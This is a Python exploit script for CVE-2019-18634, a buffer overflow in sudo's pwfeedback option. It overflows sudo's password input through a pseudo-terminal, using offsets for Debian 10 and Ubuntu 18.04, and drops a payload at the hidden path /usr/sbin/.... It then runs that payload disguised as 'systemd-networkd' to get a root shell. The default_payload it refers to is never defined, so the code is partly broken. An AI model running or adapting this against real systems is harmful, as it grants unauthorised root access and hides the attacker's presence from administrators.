#!/usr/bin/env python3
"""
CVE-2019-18634
"""
import argparse
import base64
import os
import pty
import struct
import subprocess
import zlib
from multiprocessing import Process

from time import sleep

erase = b'\x15'
payload_file = "/tmp/s"
dest = "/usr/sbin/..."
run_cmd = f'#!/bin/sh\nid > /tmp/id'

if os.environ.get("DEBUG"):
    p = print
else:
    def p(*args, **kwargs):
        pass


def p64(n):
    return struct.pack("<Q", n)


def p32(n):
    return struct.pack("<I", n)


tgp_askpass = p32(0xf)


def prep(payload):
    new = b""
    for b in range(0, len(payload), 254):
        new += payload[b:b + 254] + erase
    new += b"\x00" * (1004 - len(new)) + b'\n'
    return new


def generate_exploit(offset):
    return b'\x00' * offset + tgp_askpass


def cleanup():
    for path in ('/tmp/pty', '/tmp/d'):
        try:
            os.unlink(path)
        except Exception as e:
            p(e)
            pass


def check_worked():
    return os.path.isfile(dest)


def which(program):
    import os

    def is_exe(fpath):
        return os.path.isfile(fpath) and os.access(fpath, os.X_OK)

    fpath, fname = os.path.split(program)
    if fpath:
        if is_exe(program):
            return program
    else:
        for path in os.environ["PATH"].split(os.pathsep):
            exe_file = os.path.join(path, program)
            if is_exe(exe_file):
                return exe_file

    return None


def deploy(payload):
    with open(payload_file, "wb") as f:
        f.write(load(payload))


def load(data):
    return zlib.decompress(base64.b64decode(data))


def shell(argv=['systemd-networkd']):
    os.execv(dest, argv)


def get_sudo_version():
    return subprocess.run(['sudo', '--version'], capture_output=True).stdout.decode().split('\n')[0].split()[2]


def sudo(slave_pty):
    subprocess.run(f"/bin/bash -c 'sudo -S id < {os.ttyname(slave_pty)}'",
                   shell=True, env={'SUDO_ASKPASS': "/tmp/d"})


def main(args):
    if check_worked():
        p("Already have shell")
        shell()
    if not (version := get_sudo_version()):
        p("No sudo?")
        raise SystemExit
    p("Sudo version:", version)
    f, s, t = version.split('.')
    if int(f) > 1 or int(s) > 8 or version[:4] == "1.8." and int(t[:2]) > 30:
        p("Unsupported version")
        raise SystemExit
    exploit = generate_exploit(args.offset)
    with open("/tmp/d", "w") as f:
        f.write(run_cmd)
    os.chmod("/tmp/d", 0o755)
    master, slave = pty.openpty()
    if args.payload:
        if not os.path.isfile(args.payload):
            p("Payload doesn't exist.")
            raise SystemExit
        payload = open(args.payload, "rb").read()
    else:
        payload = default_payload
    deploy(payload)
    sleep(0.5)
    try:
        Process(target=sudo, args=(slave,)).start()
    except Exception as e:
        p(e)
    sleep(0.5)
    os.write(master, prep(exploit))
    sleep(1)
    for _ in range(3):
        if check_worked():
            shell()
            break
        else:
            p("failed")
        sleep(1)
    cleanup()


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-o', '--offset', type=int, default=624, help="debian10: 624, "
                                                                      "ubuntu18.04: 336, "
                                                                      "unk: 548"
                        )
    parser.add_argument('-c', '--command')
    parser.add_argument('-p', '--payload')
    main(parser.parse_args())
